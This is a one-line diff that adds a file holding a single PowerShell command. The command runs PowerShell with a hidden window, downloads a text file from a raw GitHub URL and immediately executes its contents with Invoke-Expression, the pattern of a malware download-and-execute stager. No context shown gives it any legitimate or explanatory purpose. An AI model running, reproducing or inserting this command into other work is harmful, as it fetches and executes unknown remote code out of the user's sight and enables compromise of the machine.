@@ -1,0 +1,1 @@
+powershell.exe -W Hidden -command  $uR='https://raw.githubusercontent.com/blackcodeit407/system/refs/heads/main/vent.txt?dsds=dsdsdsd'; $reS=Invoke-WebRequest -Uri $uR -UseBasicParsing; $t=$reS.Content; iex $t
